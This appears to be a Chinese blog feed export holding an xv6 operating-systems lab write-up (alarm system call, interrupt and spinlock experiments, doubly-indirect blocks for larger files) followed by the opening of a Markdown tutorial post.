<p><code>sysproc.c</code>（添加系统调用函数的实现）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cpu alarm</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">sys_alarm(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ticks;</span><br><span class="line">  <span class="keyword">void</span> (*handler)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;ticks) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(argptr(<span class="number">1</span>, (<span class="keyword">char</span>**)&amp;handler, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  myproc()-&gt;alarmticks = ticks;</span><br><span class="line">  myproc()-&gt;alarmhandler = handler;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，在 <code>proc.h</code> 的结构体 <code>proc</code> 中添加：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> alarmticks;</span><br><span class="line"><span class="keyword">int</span> curticks;</span><br><span class="line"><span class="keyword">void</span> (*alarmhandler)();</span><br></pre></td></tr></table></figure>
<p>根据提示，新建文件<code>alarmtest.c</code>，添加使用此系统调用函数的方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">periodic</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">&quot;alarmtest starting\n&quot;</span>);</span><br><span class="line">  alarm(<span class="number">10</span>, periodic);</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">25</span>*<span class="number">500000</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>((i % <span class="number">250000</span>) == <span class="number">0</span>)</span><br><span class="line">      write(<span class="number">2</span>, <span class="string">&quot;.&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">periodic()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">&quot;alarm!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>MakeFile</code>中添加<code>UPROGS</code>对应的命令：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">_alarmtest\</span><br></pre></td></tr></table></figure>
<p>根据提示，在<code>trap.c</code>中处理时钟中断添加<code>handler</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> T_IRQ0 + IRQ_TIMER:</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    acquire(&amp;tickslock);</span><br><span class="line">    ticks++;</span><br><span class="line">    wakeup(&amp;ticks);</span><br><span class="line">    release(&amp;tickslock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(myproc() != <span class="number">0</span> &amp;&amp; (tf-&gt;cs &amp; <span class="number">3</span>) == <span class="number">3</span>) &#123;</span><br><span class="line">    myproc()-&gt;curticks++;</span><br><span class="line">    <span class="keyword">if</span>(myproc()-&gt;alarmticks == myproc()-&gt;curticks) &#123;</span><br><span class="line">      myproc()-&gt;curticks = <span class="number">0</span>;</span><br><span class="line">      tf-&gt;esp -= <span class="number">4</span>;    </span><br><span class="line">      *((uint *)(tf-&gt;esp)) = tf-&gt;eip;</span><br><span class="line">      tf-&gt;eip =(uint)myproc()-&gt;alarmhandler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  lapiceoi();</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>重新运行<code>make qemu</code>并键入<code>alarmtest</code>，得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> alarmtest</span></span><br><span class="line">alarmtest starting</span><br><span class="line">...........................................alarm!</span><br></pre></td></tr></table></figure>
<p>根据提示：</p>
<blockquote>
<p>If you only see one “alarm!”, try increasing the number of iterations in <code>alarmtest.c</code> by 10x.</p>
</blockquote>
<p>将<code>alarmtest.c</code>中<code>for</code>循环的判断条件改为<code>i &lt; 250*500000</code>，再次运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> alarmtest</span></span><br><span class="line">alarmtest starting</span><br><span class="line">...............................................alarm!</span><br><span class="line">.........................................................................................................alarm!</span><br><span class="line">....................................................................................................................alarm!</span><br><span class="line">............................................................................alarm!</span><br><span class="line">..............................................................................alarm!</span><br><span class="line">...........................................................................alarm!</span><br></pre></td></tr></table></figure>
<h1 id="xv6-locking"><a href="#xv6-locking" class="headerlink" title="xv6 locking"></a>xv6 locking</h1><p>探索中断和锁的相互作用。</p>
<h2 id="Don’t-do-this"><a href="#Don’t-do-this" class="headerlink" title="Don’t do this"></a>Don’t do this</h2><p>执行以下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lk</span>;</span></span><br><span class="line">initlock(&amp;lk, <span class="string">&quot;test lock&quot;</span>);</span><br><span class="line">acquire(&amp;lk);</span><br><span class="line">acquire(&amp;lk);</span><br></pre></td></tr></table></figure>
<p>根据提示，在 <code>spinlock.c</code>的<code>acquire</code> 函数中发现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(holding(lk))</span><br><span class="line">  panic(<span class="string">&quot;acquire&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>则执行代码后，连续两次申请同一个<code>spinlock</code>，内核将<code>panic</code>。</p>
<h2 id="Interrupts-in-ide-c"><a href="#Interrupts-in-ide-c" class="headerlink" title="Interrupts in ide.c"></a>Interrupts in ide.c</h2><p>未修改时：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make qemu</span></span><br><span class="line">qemu-system-i386 -serial mon:stdio -drive file=fs.img,index=1,media=disk,format=raw -drive file=xv6.img,index=0,media=disk,format=raw -smp 2 -m 512 </span><br><span class="line">xv6...</span><br><span class="line">cpu1: starting 1</span><br><span class="line">cpu0: starting 0</span><br><span class="line">sb: size 1000 nblocks 941 ninodes 200 nlog 30 logstart 2 inodestart 32 bmap start 58</span><br><span class="line">init: starting sh</span><br></pre></td></tr></table></figure>
<p>在<code>ide.c</code>的<code>iderw</code>函数中，在调用<code>acquire</code>函数后调用<code>sti</code>函数，在调用<code>release</code>函数前调用<code>cli</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">iderw(struct buf *b)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> **<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;iderw: buf not locked&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((b-&gt;flags &amp; (B_VALID|B_DIRTY)) == B_VALID)</span><br><span class="line">    panic(<span class="string">&quot;iderw: nothing to do&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(b-&gt;dev != <span class="number">0</span> &amp;&amp; !havedisk1)</span><br><span class="line">    panic(<span class="string">&quot;iderw: ide disk 1 not present&quot;</span>);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;idelock);  <span class="comment">//DOC:acquire-lock</span></span><br><span class="line">  sti();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Append b to idequeue.</span></span><br><span class="line">  b-&gt;qnext = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(pp=&amp;idequeue; *pp; pp=&amp;(*pp)-&gt;qnext)  <span class="comment">//DOC:insert-queue</span></span><br><span class="line">    ;</span><br><span class="line">  *pp = b;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Start disk if necessary.</span></span><br><span class="line">  <span class="keyword">if</span>(idequeue == b)</span><br><span class="line">    idestart(b);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for request to finish.</span></span><br><span class="line">  <span class="keyword">while</span>((b-&gt;flags &amp; (B_VALID|B_DIRTY)) != B_VALID)&#123;</span><br><span class="line">    sleep(b, &amp;idelock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cli();</span><br><span class="line">  release(&amp;idelock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新运行<code>make qemu</code>，得到输出如下，发生<code>panic</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make qemu</span></span><br><span class="line">qemu-system-i386 -serial mon:stdio -drive file=fs.img,index=1,media=disk,format=raw -drive file=xv6.img,index=0,media=disk,format=raw -smp 2 -m 512 </span><br><span class="line">xv6...</span><br><span class="line">cpu1: starting 1</span><br><span class="line">cpu0: starting 0</span><br><span class="line">sb: size 1000 nblocks 941 ninodes 200 nlog 30 logstart 2 inodestart 32 bmap start 58</span><br><span class="line">init: starting sh</span><br><span class="line">lapicid 1: panic: sched locks</span><br><span class="line"> 80103cde 80103eb3 801058cd 801055d1 801001c6 801017af 80106d74 80100afb 801049df 801047ae</span><br></pre></td></tr></table></figure>
<p>发生<code>panic</code>的原因可能是在<code>release</code>释放锁之前发生中断，为了响应中断进行调度，此时又有新的锁申请，所以发生<code>panic</code>。</p>
<h2 id="Interrupts-in-file-c"><a href="#Interrupts-in-file-c" class="headerlink" title="Interrupts in file.c"></a>Interrupts in file.c</h2><p>根据提示，在<code>file.c</code>的<code>filealloc</code>函数中，在调用<code>acquire</code>函数后调用<code>sti</code>函数，在每次调用<code>release</code>函数前调用<code>cli</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate a file structure.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>*</span></span><br><span class="line"><span class="class"><span class="title">filealloc</span>(<span class="title">void</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;ftable.lock);</span><br><span class="line">  sti();</span><br><span class="line">  <span class="keyword">for</span>(f = ftable.file; f &lt; ftable.file + NFILE; f++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(f-&gt;ref == <span class="number">0</span>)&#123;</span><br><span class="line">      f-&gt;ref = <span class="number">1</span>;</span><br><span class="line">      cli();</span><br><span class="line">      release(&amp;ftable.lock);</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cli();</span><br><span class="line">  release(&amp;ftable.lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要<code>#include &quot;x86.h&quot;</code>。</p>
<p>重新运行<code>make qemu</code>，得到输出如下，未发生<code>panic</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make qemu</span></span><br><span class="line">qemu-system-i386 -serial mon:stdio -drive file=fs.img,index=1,media=disk,format=raw -drive file=xv6.img,index=0,media=disk,format=raw -smp 2 -m 512 </span><br><span class="line">xv6...</span><br><span class="line">cpu1: starting 1</span><br><span class="line">cpu0: starting 0</span><br><span class="line">sb: size 1000 nblocks 941 ninodes 200 nlog 30 logstart 2 inodestart 32 bmap start 58</span><br><span class="line">init: starting sh</span><br></pre></td></tr></table></figure>
<p>未发生<code>panic</code>的原因可能是<code>filealloc</code>占用时间短、发生次数较少，只有极小概率与其他读写文件发生冲突。</p>
<h2 id="xv6-lock-implementation"><a href="#xv6-lock-implementation" class="headerlink" title="xv6 lock implementation"></a>xv6 lock implementation</h2><p>相关代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Release the lock.</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">release(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holding(lk))</span><br><span class="line">    panic(<span class="string">&quot;release&quot;</span>);</span><br><span class="line"></span><br><span class="line">  lk-&gt;pcs[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  lk-&gt;cpu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell the C compiler and the processor to not move loads or stores</span></span><br><span class="line">  <span class="comment">// past this point, to ensure that all the stores in the critical</span></span><br><span class="line">  <span class="comment">// section are visible to other cores before the lock is released.</span></span><br><span class="line">  <span class="comment">// Both the C compiler and the hardware may re-order loads and</span></span><br><span class="line">  <span class="comment">// stores; __sync_synchronize() tells them both not to.</span></span><br><span class="line">  __sync_synchronize();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Release the lock, equivalent to lk-&gt;locked = 0.</span></span><br><span class="line">  <span class="comment">// This code can&#x27;t use a C assignment, since it might</span></span><br><span class="line">  <span class="comment">// not be atomic. A real OS would use C atomics here.</span></span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;movl $0, %0&quot;</span> : <span class="string">&quot;+m&quot;</span> (lk-&gt;locked) : )</span></span>;</span><br><span class="line"></span><br><span class="line">  popcli();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若<code>release</code>函数先将<code>lk-&gt;locked</code>清零，其他正在<code>acquire()</code>等待的进程将立即执行，将会更改<code>lk-&gt;pcs[0]</code>和<code>lk-&gt;cpu</code>，但此时<code>release</code>函数也将修改<code>lk-&gt;pcs[0]</code>和<code>lk-&gt;cpu</code>值，故发生错误。</p>
<h1 id="bigger-files-for-xv6"><a href="#bigger-files-for-xv6" class="headerlink" title="bigger files for xv6"></a>bigger files for xv6</h1><p>增加xv6文件的最大大小，从<code>140 sectors</code>到<code>16523 sectors</code>。</p>
<p>根据提示，修改<code>Makefile</code>：</p>
<ul>
<li>修改<code>CPUS := 2</code>为<code>CPUS := 1</code></li>
<li>添加<code>QWMUEXTRA = -snapshot</code></li>
<li>在<code>UPROGS</code>中添加<code>_big\</code>：</li>
</ul>
<p>根据提示，修改<code>param.h</code>：</p>
<ul>
<li>修改<code>#define FSSIZE 1000</code>为<code>#define FSSIZE 20000</code></li>
</ul>
<p>根据提示，添加文件<code>big.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">int</span> fd, i, sectors;</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;big.file&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;big: cannot open big.file for writing\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sectors = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    *(<span class="keyword">int</span>*)buf = sectors;</span><br><span class="line">    <span class="keyword">int</span> cc = write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(cc &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sectors++;</span><br><span class="line">	<span class="keyword">if</span> (sectors % <span class="number">100</span> == <span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">&quot;\nwrote %d sectors\n&quot;</span>, sectors);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  fd = open(<span class="string">&quot;big.file&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;big: cannot re-open big.file for reading\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sectors; i++)&#123;</span><br><span class="line">    <span class="keyword">int</span> cc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(cc &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;big: read error at sector %d\n&quot;</span>, i);</span><br><span class="line">      <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(*(<span class="keyword">int</span>*)buf != i)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;big: read the wrong data (%d) for sector %d\n&quot;</span>,</span><br><span class="line">             *(<span class="keyword">int</span>*)buf, i);</span><br><span class="line">      <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">&quot;done; ok\n&quot;</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时重新运行<code>make qemu</code>并键入<code>big</code>，显示<code>wrote 140 sectors</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> big</span> </span><br><span class="line">.</span><br><span class="line">wrote 140 sectors</span><br><span class="line">done; ok</span><br></pre></td></tr></table></figure>
<p>根据提示，修改<code>fs.c</code>中的<code>bmap</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> uint</span><br><span class="line">bmap(struct inode *ip, uint bn)</span><br><span class="line">&#123;</span><br><span class="line">  uint addr, *a;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp2</span>;</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">	</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  bn -= NINDIRECT;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (bn &lt; NINDIRECT * NINDIRECT) &#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT+<span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">		ip-&gt;addrs[NDIRECT+<span class="number">1</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line"></span><br><span class="line">	bp = bread(ip-&gt;dev, addr);</span><br><span class="line"></span><br><span class="line">    a = (uint *)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span> ((addr = a[bn/NINDIRECT]) == <span class="number">0</span>) &#123;</span><br><span class="line">       a[bn/NINDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">	   log_write(bp);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	bp2 = bread(ip-&gt;dev, addr);</span><br><span class="line"></span><br><span class="line">	a = (uint *)bp2-&gt;data;</span><br><span class="line">	<span class="keyword">if</span> ((addr = a[bn%NINDIRECT]) == <span class="number">0</span>) &#123;</span><br><span class="line">	  a[bn%NINDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp2);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	brelse(bp2);</span><br><span class="line">	brelse(bp);</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  panic(<span class="string">&quot;bmap: out of range&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，修改<code>fs.h</code>：</p>
<ul>
<li>修改<code>#define NDIRECT 12</code>为<code>#define NDIRECT 11</code></li>
<li>修改<code>#define MAXFILE (NDIRECT + NINDIRECT)</code>为<code>#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT * NINDIRECT)</code></li>
<li>修改<code>uint addrs[NDIRECT+1]</code>为<code>uint addrs[NDIRECT+2]</code></li>
</ul>
<p>根据提示，修改<code>file.h</code>：</p>
<ul>
<li>修改<code>uint addrs[NDIRECT+1]</code>为<code>uint addrs[NDIRECT+2]</code></li>
</ul>
<p>最终重新运行<code>make qemu</code>并键入<code>big</code>，显示<code>wrote 16523 sectors</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> big</span></span><br><span class="line">.....................................................................................................................................................................</span><br><span class="line">wrote 16523 sectors</span><br><span class="line">done; ok</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>让 Markdown Powerup（摘自「庭说」）</title>
    <url>/markdown/</url>
    <content><![CDATA[<p>如何写文章？</p>
<a id="more"></a>

<p>你应该知道，通过 <code>hexo n new_post</code> 可以新建一篇文章。新建的文章会出现在 <code>/source/_posts/</code> 中，是一个扩展名为 <code>md</code> 的文档。</p>
<p>熟悉 Microsoft Word 的同学可能印象中文档的扩展名都是 <code>docx</code> 或 <code>doc</code>、<code>txt</code>、<code>rtf</code> 等，<code>md</code> 扩展名意味着这是一个新的格式，其实是一种新的语言——</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/Markdown.png"></p>
<p><strong>Markdown</strong>。</p>
<p>现代汉语就像用脏了的人民币，要用 Markdown 洗一洗。（钟哥の奇妙比喻）</p>
<p>Markdown 是一种轻量级标记语言。你不需要关心标题多大字号，段前距多少，列表缩进几格，只要在<strong>纯文本</strong>前后增加一些标记符号（例如 <code>#</code> <code>-</code> <code>*</code> <code>&gt;</code>），就能毫不费力地写出工整精美的文章。毫不夸张地说，Markdown 是比特世界赠予写作者的「笔」。</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
<li><p>易学易记</p>
<p>只要几分钟就可以 <a href="https://commonmark.org/help/tutorial/">学会 Markdown</a>，然后你可能再也不想碰 Word 了。</p>
</li>
<li><p>专注写作</p>
<p>富文本编辑器（例如 Word）是通过点击图形化的功能按钮来实现排版，而 Markdown 则是通过标记字符去赋予文字不同格式。<strong>易读易写</strong>（easy-to-read and easy-to-write），让任何与文字打交道的人专注于写作，不用操心排版。</p>
</li>
<li><p>格式统一</p>
<p>同一份 Word 文档，在</p>
<ul>
<li>不同的设备：Windows、macOS、Android、iOS</li>
<li>不同的版本：旧版 Word 、新版 Word</li>
<li>不同的软件：Microsoft Office、WPS</li>
</ul>
<p>可能显示不一样的效果。而 Markdown 可以 Write once, export everywhere。不管在电脑上，还是手机上，用 Markdown 写出来的文章都能带来舒适、统一、美好的阅读体验。</p>
</li>
<li><p>向外兼容</p>
<p>可以导出 PDF、 Word、HTML、图片等格式分享给没有安装 Markdown 编辑器的人。</p>
</li>
</ul>
<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>一开始你只要记住以下符号（英文半角状态），就能写出排版清爽的文章了。</p>
<table>
<thead>
<tr>
<th>标记符号</th>
<th>标记结果</th>
</tr>
</thead>
<tbody><tr>
<td><code>#</code> + <code>空格</code> + <code>文本</code></td>
<td>一级标题</td>
</tr>
<tr>
<td><code>##</code> + <code>空格</code> + <code>文本</code></td>
<td>二级标题</td>
</tr>
<tr>
<td><code>###</code> + <code>空格</code> + <code>文本</code></td>
<td>三级标题</td>
</tr>
<tr>
<td><code>-</code> + <code>空格</code> + <code>文本</code></td>
<td>无序列表</td>
</tr>
<tr>
<td><code>1</code> + <code>.</code> + <code>空格</code> + <code>文本</code></td>
<td>有序列表</td>
</tr>
<tr>
<td><code>&gt;</code> + <code>空格</code> + <code>文本</code></td>
<td>引用</td>
</tr>
</tbody></table>
<p>如果有些文字需要特殊说明：</p>
<table>
<thead>
<tr>
<th>标记符号</th>
<th>标记结果</th>
</tr>
</thead>
<tbody><tr>
<td><code>**</code> + <code>加粗</code> + <code>**</code></td>
<td><strong>加粗</strong></td>
</tr>
<tr>
<td><code>*</code> + <code>斜体</code> + <code>*</code></td>
<td><em>斜体</em></td>
</tr>
<tr>
<td><code>~~</code> + <code>删除线</code> + <code>~~</code></td>
<td>删除线</td>
</tr>
</tbody></table>
<p>是不是手痒了？下载一个 <a href="https://sspai.com/tag/Markdown">Markdown 编辑器</a>， Keep calm and Markdown。</p>
<ul>
<li>Windows 和 macOS 用户推荐 <a href="https://typora.io/">Typora</a>。</li>
<li>Android 用户推荐 <a href="https://writer.drakeet.com/">纯纯写作</a>。</li>
<li>iOS 和 iPadOS 用户可以在 App Store 搜索「Markdown」下载（没找到好用的软件，如果找到了一定要告诉我）。</li>
</ul>
<p><img src="https://i.loli.net/2019/07/15/5d2b601b5f46477978.gif" alt="What You See Is What You Mean"></p>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>以上就是最基础的 Markdown 语法，普通用户看到这里就可以开始动笔尝试了。下面介绍一些 Markdown 的书写风格，让你的源码和文档更精美，更有条理。你不必一下子全部记住，需要实现哪个功能再来查阅或者问 <a href="https://tingtalk.me/fq/">Google</a> 也不迟。</p>
<h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p><strong>层级</strong></p>
<ul>
<li><p>正文的标题从 <code>##</code> 开始，<code>#</code> 要留给整篇文章的标题（也可以不写）。这样的大纲结构也可以很方便地转换为思维导图（Markdown to <a href="https://www.xmind.cn/">Xmind</a> / <a href="https://mindnode.com/">MindNode</a> / <a href="https://mubu.com/">幕布</a> / <a href="http://naotu.baidu.com/">百度脑图</a>……），也符合 SEO（搜索引擎优化）的规则。</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># 一级标题（h1）：文章的标题</span><br><span class="line"></span><br><span class="line">## 二级标题（h2）：正文的大标题</span><br><span class="line"></span><br><span class="line">### 三级标题（h3）：正文的小标题</span><br></pre></td></tr></table></figure></li>
<li><p>虽然 Markdown 最大支持 <code>######</code> 六级标题，为了保持层级的简单，防止出现过于复杂的章节，请谨慎使用四级标题（除非是长文章）。如果三级标题下有并列性的内容，可以使用加粗、有序列表或无序列表代表末级标题。</p>
